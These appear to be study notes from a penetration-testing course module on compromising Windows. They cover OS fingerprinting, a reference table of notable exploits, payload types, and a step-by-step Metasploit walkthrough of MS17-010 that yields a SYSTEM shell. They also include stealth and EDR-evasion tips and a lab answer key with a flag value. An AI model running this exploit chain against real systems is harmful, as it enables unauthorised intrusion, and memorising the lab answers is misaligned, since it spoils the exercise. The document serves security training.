# NOTE — Infiltrating Windows

## ID
406

## Module
Shells & Payloads

## Kind
notes

## Title
Section 9 — Infiltrating Windows

## Description
End-to-end Windows compromise walkthrough — TTL-based fingerprinting, Nmap OS detection, picking from common Windows exploits (MS17-010 / EternalBlue), running `ms17_010_psexec`, and choosing between cmd and PowerShell on the popped host.

## Tags
windows, eternalblue, ms17-010, ttl, fingerprinting, cmd, powershell, payload-types

## Commands
- `ping <ip>` — TTL ~128 = Windows
- `sudo nmap -v -O <ip>` — OS detection scan
- `sudo nmap -v <ip> --script banner.nse` — banner grabbing
- `use auxiliary/scanner/smb/smb_ms17_010` — Check for EternalBlue
- `use exploit/windows/smb/ms17_010_psexec` — psexec variant of EternalBlue exploit
- `set RHOSTS / set LHOST / set LPORT` — exploit options
- `exploit` — fire
- `meterpreter > shell` — drop to cmd
- `hostname` — verify pop

## What This Section Covers
Windows is ~70% of enterprise endpoints — vast attack surface. Module covers fingerprinting the OS (TTL, Nmap), surveying historical critical vulns, mapping the Windows-specific payload file types, and running a full exploit chain against MS17-010.

## Fingerprinting Windows
| Signal | Indicator |
|--------|-----------|
| Ping TTL | ~128 = Windows (Linux ~64, Cisco ~255) |
| Open ports 135/139/445 | Almost certainly Windows (RPC/NetBIOS/SMB) |
| `nmap -O` output | `OS CPE: cpe:/o:microsoft:windows_*` |
| Service banners (902/912) | VMware Workstation = likely Windows host |
| SMB version detection | Returns full Windows build (e.g. "Windows Server 2016 Standard 14393") |

## Notable Windows Exploits — Reference Table
| Vuln | Description |
|------|-------------|
| **MS08-067** | SMB flaw used by Conficker and Stuxnet |
| **EternalBlue (MS17-010)** | SMBv1 RCE; WannaCry/NotPetya; 200k+ infected in 2017 |
| **PrintNightmare** | Print Spooler RCE — SYSTEM via printer driver install |
| **BlueKeep (CVE-2019-0708)** | RDP RCE; Win2000 → 2008 R2 |
| **SIGRed (CVE-2020-1350)** | DNS server RCE — Domain Admin via DC's DNS |
| **SeriousSAM (CVE-2021-36934)** | Non-elevated read of SAM via Volume Shadow Copies |
| **Zerologon (CVE-2020-1472)** | MS-NRPC crypto flaw; 256-guess account password reset |

## Windows Payload File Types
| Type | Use Case |
|------|----------|
| **DLL** | Inject for SYSTEM/UAC bypass; library hijacking |
| **Batch (.bat)** | Quick automation; DOS scripts |
| **VBS** | Phishing — macro enablement, ws scripting |
| **MSI** | Install via `msiexec` — often elevated |
| **PowerShell (.ps1)** | Modern scripting + .NET interop; most flexible |

## Payload Generation & Delivery Tools
| Tool | Purpose |
|------|---------|
| MSFvenom / Metasploit | Multi-platform payload generation + framework |
| PayloadsAllTheThings | Cheat-sheet repo for one-liners |
| Mythic C2 | Alternative C2 framework |
| Nishang | Offensive PowerShell scripts |
| Darkarmour | Obfuscated binaries against Windows |

Delivery: Impacket (psexec/smbclient/wmi), SMB shares (`ADMIN$`/`C$`), MSF exploit-bundled, FTP/TFTP/HTTP, browser drive-by.

## Full Walkthrough — MS17-010 via psexec
```shellsession
# 1. Enumerate
nmap -v -A <ip>

# 2. Validate vulnerability
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <ip>
run
# → [+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010!

# 3. Select exploit
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <ip>
set LHOST <attacker-ip>
exploit
# → Meterpreter session 1 opened ... NT AUTHORITY\SYSTEM
```

## cmd vs PowerShell — Picking Your Shell
| Use **cmd** when | Use **PowerShell** when |
|-------|-------|
| Pre-Win7 host (no PS) | Modern host with cmdlets available |
| Simple navigation/I/O | Need .NET objects, not text |
| Avoiding command history (stealth) | Stealth less critical |
| Execution Policy / UAC blocks PS | Cloud-services interaction |
| Net commands, batch files | Custom scripts, aliases |

Prompt tells which: `C:\Windows\system32>` = cmd; `PS C:\Windows\system32>` = PowerShell.

## WSL / PowerShell Core — Blind Spots
- WSL traffic often not parsed by Windows Defender Firewall.
- PowerShell Core on Linux carries many PS functions, lower detection coverage.
- Both are emerging attack vectors that bypass legacy EDR.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Text-based DOS script extension | **.bat** | "Payload Types to Consider" — batch files. |
| Q2 — Shadow Brokers leak exploit (MS bulletin) | **MS17-010** | EternalBlue in "Prominent Windows Exploits" table. |
| Q3 — Contents of `C:\flag.txt` | **EB-Still-W0rk$** | `nmap -A` confirms Win Server 2016, SMB open → `use exploit/windows/smb/ms17_010_psexec`, set RHOSTS+LHOST, `exploit` → `cat C:/flag.txt` from Meterpreter. |

## Key Takeaways
- TTL ~128 = Windows is the single fastest fingerprinting heuristic.
- MS17-010 EternalBlue is still encountered against under-patched 2008/2012/2016 hosts.
- The Rapid7 module list isn't authoritative — check GitHub for exploits not bundled with your MSF install (drop them into `/usr/share/metasploit-framework/modules/exploits/...`).
- Inside Meterpreter, `shell` drops to cmd by default; check the prompt to confirm.

## Gotchas
- `-A` Nmap can fail behind firewalls — re-run with `-Pn` if hosts appear down.
- TTL is decremented per hop — 124 from L3 distance ≠ Linux; subtract hops first.
- Some MSF modules in the GitHub repo aren't shipped with the local install — copy `.rb` files into the proper exploit subfolder.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|shells-payloads]]
← [[08-crafting-payloads-msfvenom]] | [[10-infiltrating-linux]] →
<!-- AUTO-LINKS-END -->
